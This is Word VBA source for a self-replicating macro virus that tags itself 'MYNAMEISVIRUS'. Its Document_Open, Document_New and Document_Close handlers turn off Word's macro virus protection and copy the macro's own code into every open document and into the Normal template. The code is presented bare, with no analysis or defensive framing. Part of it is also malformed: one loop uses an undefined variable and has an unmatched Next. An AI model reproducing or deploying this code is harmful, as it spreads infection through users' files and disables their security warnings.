   VERSION 1.0 CLASS
   BEGIN
     MultiUse = -1  'True
   END
   Attribute VB_Name = "ThisDocument"
   Attribute VB_GlobalNameSpace = False
   Attribute VB_Creatable = False
   Attribute VB_PredeclaredId = True
   Attribute VB_Exposed = True

   Private Sub Document_Close()

   '

   Dim aready As Boolean
   Dim star As Long
   Dim send As Long
   Dim answer As String
   Dim path$
    Options.VirusProtection = False
    answer = "MYNAMEISVIRUS"
   star = 1
   send = 1
   path$ = Options.DefaultFilePath(wdUserTemplatesPath)
   If Documents.Count <> 0 Then
   For i = 1 To Documents.Count
      ' If xitem.Name = "NewMacros" Then
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If
       End If
   Next
   Next
   End If
     For Each xitem In NormalTemplate.VBProject.VBComponents
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If

       End If
   Next
   End Sub

   Private Sub Document_New()
   '
   Dim aready As Boolean
   Dim star As Long
   Dim send As Long
   Dim answer As String
   Dim path$
    Options.VirusProtection = False
    answer = "MYNAMEISVIRUS"
   star = 1
   send = 1
   path$ = Options.DefaultFilePath(wdUserTemplatesPath)
   If Count <> 1 Then
     Count = Count + 1
    ' Documents.Add
   End If
   If Documents.Count <> 0 Then
   For i = 1 To Documents.Count
   For Each xitem In Documents(i).VBProject.VBComponents
      ' If xitem.Name = "NewMacros" Then
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If
       End If
   Next
   Next
   End If
     For Each xitem In NormalTemplate.VBProject.VBComponents
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If

       End If
   Next
   End Sub

   Private Sub Document_Open()
   Dim aready As Boolean
   Dim star As Long
   Dim send As Long
   Dim answer As String
   Dim path$
    answer = "MYNAMEISVIRUS"
     Options.VirusProtection = False
   star = 1
   send = 1
   path$ = Options.DefaultFilePath(wdUserTemplatesPath)
   If Count <> 1 Then
     Count = Count + 1
    ' Documents.Add
   End If
   If Documents.Count <> 0 Then
   For i = 1 To Documents.Count
   For Each xitem In Documents(i).VBProject.VBComponents
      ' If xitem.Name = "NewMacros" Then
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, star + send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If
       End If
   Next
   Next
   End If
     For Each xitem In NormalTemplate.VBProject.VBComponents
       If xitem.Name = "ThisDocument" Then
       send = xitem.codemodule.countoflines
       aready = xitem.codemodule.Find("MYNAMEISVIRUS", star, 1, send, 1)
       If aready = False Then
             With xitem.codemodule
                .insertlines star, MacroContainer.VBProject.VBComponents(1).codemodule.Lines(1, 150)  'codemodule.procbodyline("Autoexec", vbext_pk_Proc)
            End With
       End If

       End If
   Next
   End Sub
